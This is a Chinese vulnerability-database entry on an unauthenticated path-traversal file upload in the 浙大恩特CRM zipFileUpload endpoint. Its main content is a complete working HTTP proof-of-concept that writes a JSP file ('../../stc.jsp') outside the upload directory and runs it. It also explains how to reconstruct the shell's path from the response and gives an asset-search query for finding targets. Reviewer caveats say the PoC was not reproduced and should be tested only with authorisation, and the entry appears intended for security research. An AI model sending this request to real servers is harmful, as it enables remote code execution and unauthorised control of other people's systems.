---
source: "wy876 漏洞文库"
title: "浙大恩特CRM CrmBasicAction zipFileUpload filename遍历写"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "old传输模式及目录布局，版本未知"
prerequisites: "无Cookie请求，权限未知"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vw1xptpqmd5guxwf"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMzipFileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-adfbdaad822c4aa5c61278ea"
entity_id: "ve-adfbdaad822c4aa5c61278ea"
schema_version: "1"
---

# 浙大恩特CRM CrmBasicAction zipFileUpload filename遍历写

## 条目说明

- 对象与具体问题：浙大恩特CRM；CrmBasicAction zipFileUpload filename遍历写
- 版本、配置及部署条件：old传输模式及目录布局，版本未知
- 认证与权限前提：无Cookie请求，权限未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Type zip但body是纯JSP，不是ZIP压缩包，应核原始直写/解压行为，勿归Zip Slip而无证
- filename ../../与回显目录映射需完整返回，当前没有响应或执行乘法结果
- JSP自删仍可覆盖/状态改变；外部yaml非已核资料
- 缺版本/修复，不与420等相同payload机械合并

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM zipFileUpload任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 260
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../stc.jsp"
Content-Type: application/zip

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 260；保留原始标头；其数值未据实际请求体重新计算或验证。


根据回显拼接上传文件位置

```java
/enterdoc/dao/2024011111284104541134657/stc.jsp
```


[zhedaente-entsoft-fileupload-CrmBasicAction.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145291-128bd578-1b6b-45b2-9d79-58ca0ab390b2.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vw1xptpqmd5guxwf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
